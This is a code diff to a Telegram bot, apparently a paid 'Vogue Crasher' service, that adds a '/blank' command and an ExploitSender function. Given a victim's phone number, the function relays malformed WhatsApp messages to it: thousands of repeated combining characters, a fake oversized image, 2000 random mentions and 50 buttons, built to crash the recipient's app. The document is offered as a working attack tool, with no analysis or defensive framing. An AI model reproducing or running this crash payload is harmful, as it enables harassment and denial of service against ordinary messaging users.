@@ -573,10 +573,6 @@ The sender session has been successfully initialized and is ready for use.
     });
 };
 
-// ========================================
-// AUTO RESTART ON CONNECTION CLOSED
-// ========================================
-
 process.on(
     "uncaughtException",
     async (err) => {
@@ -3549,6 +3545,81 @@ been successfully analyzed.
 //                                                    
 //
 
+bot.command('blank', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 2; i++) {
+                try {
+                    await ExploitSender(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    await restartBot("Connection Closed");
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        await restartBot("Connection Closed");
+    }
+});
+
 bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -4386,6 +4457,56 @@ async function VogueBuldo(sock, target) {
     await restartBot("Connection Closed");
   }
 }
+}
+
+async function ExploitSender(sock, target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: { title: "Z " + "ꦾ".repeat(1000), hasMediaAttachment: false },
+          body: { text: "z҉⃝ Z CRASH".repeat(100) },
+          nativeFlowMessage: {
+            buttons: [
+              { name: "cta_url", buttonParamsJson: "{}" },
+              { name: "quick_reply", buttonParamsJson: "{}" }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  const msg2 = {
+    buttonsMessage: {
+      contentText: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(5000),
+      quotedMessage: {
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
+          fileLength: "999999999",
+          height: 9999,
+          width: 9999,
+          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
+          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
+          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1777621571",
+          contextInfo: {
+            mentionedJid: Array.from({ length: 2000 }, () => `1${Math.random() * 9e6}@s.whatsapp.net`)
+          }
+        }
+      },
+      buttons: Array.from({ length: 50 }, (_, i) => ({
+        buttonId: `btn_${i}`,
+        buttonText: { displayText: `btn ${i}` },
+        type: 1
+      }))
+    }
+  };
+
+  await sock.relayMessage(target, msg, { participant: { jid: target } });
+  await sock.relayMessage(target, msg2, { participant: { jid: target } });
 }
 
 
